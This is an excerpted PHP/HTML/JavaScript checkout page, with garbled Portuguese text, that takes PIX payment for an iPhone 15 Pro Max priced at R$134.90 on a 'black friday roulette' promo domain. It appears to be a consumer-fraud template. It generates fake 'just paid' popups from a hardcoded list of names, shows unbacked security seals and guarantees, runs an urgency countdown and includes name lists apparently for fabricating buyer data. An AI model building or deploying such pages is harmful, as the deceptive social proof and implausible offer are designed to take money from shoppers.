...
$OFFER_HASH        = '358orVyg';
$PRODUCT_HASH      = 'r8mggszhfs';
$BASE_AMOUNT       = 13490;
$PRODUCT_TITLE     = 'iPhone 15 PRO MAX 512GB TitÃ¢nio Preto';
$IS_DROPSHIPPING   = true;
$THREE_STEP_CHECKOUT = true;
...
$PIX_MODAL_COPY_BUTTON_TEXT          = 'Copiar cÃ³digo PIX';
$PIX_MODAL_VALUE_TEXT                = 'ðŸ’° Valor:';
$PIX_MODAL_EXPIRATION_TEXT           = 'ðŸ•’ VÃ¡lido atÃ©:';
...
// Data
$ALL_ORDER_BUMPS      = json_decode('[]', true);
$ALL_COUPONS          = json_decode('[]', true);
$ALL_TESTIMONIALS     = json_decode('[]', true);
$ALL_BANNERS          = json_decode('[{"path":"https://cloudfox-digital-products.s3.amazonaws.com/uploads/user/ePyE2ZyEaxZqRbV/public/stores/4KovG1nyDzgyDEm/banner/syijz1cooEkeBpXs13ImmORK04p6nfACuzUiroWf.jpg","id":"banner-9521acfe-5f74-4dfb-9e31-9d16064e6db4"},{"path":"https://cloudfox-digital-products.s3.amazonaws.com/uploads/user/ePyE2ZyEaxZqRbV/public/stores/4KovG1nyDzgyDEm/banner/syijz1cooEkeBpXs13ImmORK04p6nfACuzUiroWf.jpg","id":"banner-90b82139-fdc5-4d7a-ad7d-740e52d3c626"}]', true);
$ALL_VIDEOS           = json_decode('[]', true);
$ALL_TEXT_BLOCKS      = json_decode('[]', true);
$COMPONENT_ORDER      = json_decode('["singleton_identity","singleton_payment","singleton_testimonials"]', true);
$SOCIAL_PROOF_SETTINGS = json_decode('{"enabled":true,"names":[],"payoutMessage":"{{name}} acabou de pagar {{value}}","payoutMin":150,"payoutMax":500,"initialDelay":1,"displayDuration":1,"intervalMin":2,"intervalMax":3}', true);
$SECURITY_SEAL_SETTINGS = json_decode('{"enabled":true,"backgroundColor":"#ffffff","items":[{"id":"seal-1","icon":"eye-slash","title":"Dados protegidos","text":"Os seus dados sÃ£o confidenciais e seguros."},{"id":"seal-2","icon":"lock","title":"Pagamento 100% Seguro","text":"As informaÃ§Ãµes desta compra sÃ£o criptografadas."},{"id":"seal-4","icon":"shield","title":"Garantia de 7 dias","text":"VocÃª esta protegido por uma garantia de satisfaÃ§Ã£o"}]}', true);
$STEP_ORDERS          = json_decode('{"step1":["banner-9521acfe-5f74-4dfb-9e31-9d16064e6db4","singleton_identity"],"step2":["banner-90b82139-fdc5-4d7a-ad7d-740e52d3c626","singleton_address"],"step3":["singleton_summary","singleton_bumps","singleton_payment"]}', true);
...
if (isset($_GET['action']) && $_GET['action'] === 'check_status') {
    ...
    if (!$hash) {
        ...
        echo json_encode(['error' => 'Hash nÃ£o informado']);
        exit;
    }
...
if (isset($_GET['action']) && $_GET['action'] === 'validate_coupon' && !$THREE_STEP_CHECKOUT) {
    ...
    if ($found_coupon) {
        ...
        echo json_encode(['success' => false, 'message' => 'Cupom invÃ¡lido ou expirado.']);
    }
    exit;
}
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    $firstNames = ['JoÃ£o', 'Marcos', 'Pedro', 'Lucas', 'Mateus', 'Gabriel', 'Daniel', 'Bruno', 'Maria', 'Ana', 'Juliana', 'Camila', 'Beatriz', 'Larissa', 'Sofia', 'Laura'];
...
function render_checkout_component($component_id, $all_components_map) {
    ...
    $checkout_settings = [
        ...
        'headerText' => 'Compra Segura e RÃ¡pida',
        'summaryText' => 'VocÃª estÃ¡ resgatando:',
        'productLogoURL' => 'https://roletadepromoblackfriday.com/Produtos/iph08/images/iphone_15_pro_max_titanio_preto.jpg',
        'title' => 'iPhone 15 PRO MAX 512GB TitÃ¢nio Preto',
        'amountFormatted' => 'R$ ' . number_format(13490 / 100, 2, ',', '.'),
    ...
    if ($component_id === 'singleton_header') {
        if (!empty($checkout_settings['headerText'])) {
            echo '<header style="background-color: ' . htmlspecialchars($checkout_settings['headerColor'] ?? '#1f2937') . '; color: ' . htmlspecialchars($checkout_settings['headerTextColor'] ?? '#ffffff') . ';" class="w-full p-3 text-center text-sm font-semibold shadow-md">
  <!-- Pixel UTMify -->
<script>
  window.pixelId = "68ae862e337d8ad86eccef6a";
...
<!-- /Pixel UTMify -->
' . htmlspecialchars($checkout_settings['headerText']) . '</header>';
        }
        ...
        echo '</span><h2 class="text-xl font-bold text-gray-800">' . ($is_identity ? 'Identifique-se' : 'EndereÃ§o de Entrega') . '</h2></div>';
        ...
        echo '<div class="mt-4 text-center text-gray-500 text-sm flex items-center justify-center gap-2">'  . '<span>Pagamento seguro via <strong>PIX</strong> com aprovaÃ§Ã£o imediata.</span></div>';
        echo '</div>';
...
<head>
    ...
    <title><?php echo htmlspecialchars('iPhone 15 PRO MAX 512GB TitÃ¢nio Preto'); ?></title>
...
<?php endif; ?>
    <style>
        ...
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #f3db1a; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; margin-right: 8px; }
...
<body>
    ...
    <main id="checkout-container" class="space-y-6 <?php echo (!$THREE_STEP_CHECKOUT && !empty($COMPONENT_ORDER) && in_array($COMPONENT_ORDER[0], ['singleton_header'])) ? 'pb-6' : 'py-6'; ?>">
        <?php if ($THREE_STEP_CHECKOUT): ?>
            <div class="constrained-width">
                <div id="step-indicator-container" class="flex justify-between items-center mb-6">
                     <?php $step_titles = ["IdentificaÃ§Ã£o", "EndereÃ§o", "Pagamento"]; ?>
            ...
            <div class="constrained-width mt-6">
                <div id="step-navigation" class="flex gap-4">
                    ...
                    <button type="button" id="next-btn" class="flex-1 p-3 font-bold text-white transition" style="background-color: #f3db1a; border-radius: <?php echo $BUTTON_RADIUS; ?>;">Continuar</button>
                </div>
            </div>
      ...
      <div class="constrained-width">
        <?php if (!empty('Compra 100% segura. Reembolso garantido em atÃ© 7 dias.')): ?> <p class="text-center text-sm text-gray-500 mt-6"><?php echo htmlspecialchars('Compra 100% segura. Reembolso garantido em atÃ© 7 dias.'); ?></p> <?php endif; ?>
      </div>
    </main>
...
document.addEventListener('DOMContentLoaded', () => {
    ...
    let totalAmount = 13490;
    let baseAmount = 13490;
    ...
    if (applyCouponBtn) {
        applyCouponBtn.addEventListener('click', async () => {
            ...
            if (!code) {
                couponMessageEl.textContent = 'Por favor, insira um cÃ³digo.';
            ...
            try {
                ...
                if (response.ok && result.success) {
                    ...
                    couponMessageEl.textContent = result.message || 'Cupom invÃ¡lido.';
    ...
    function showPixModal(result) {
        ...
        if (!pixCodeText) { throw new Error('Resposta da API invÃ¡lida.'); }
    ...
    const timerDurationInMinutes = 20;
    ...
    if (socialProofSettings && socialProofSettings.enabled) {
        ...
        const defaultNames = ["Maria", "JosÃ©", "Ana", "JoÃ£o", "AntÃ´nio", "Francisco", "Carlos", "Paulo", "Pedro", "Lucas", "Luiz", "Marcos", "Gabriel", "Rafael", "Daniel", "Marcelo", "Bruno", "Eduardo", "Felipe", "Sandra", "Camila", "Amanda", "Fernanda", "PatrÃ­cia", "Juliana", "Aline", "Mariana", "Vanessa", "Carolina"];
